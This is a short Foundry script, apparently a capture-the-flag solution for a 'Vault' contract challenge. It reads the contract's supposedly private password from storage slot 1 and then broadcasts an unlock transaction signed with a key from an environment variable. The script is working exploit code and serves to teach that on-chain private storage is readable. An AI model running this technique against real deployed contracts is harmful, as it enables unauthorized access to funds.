// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Script.sol";

import {Vault} from "../src/vault/Vault.sol";

contract CounterScript is Script {
    Vault vault;
    uint256 playerKey;

    function setUp() public {
        vault = Vault(0x06Fc4fDC48E96d4AC8b0350Be7f95a7549A5D77e);
        playerKey = vm.envUint("PRIVATE_KEY");
    }

    function run() public {
        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));

        assert(vault.locked());
        vm.startBroadcast(playerKey);
        vault.unlock(password);

        assert(!vault.locked());
    }
}
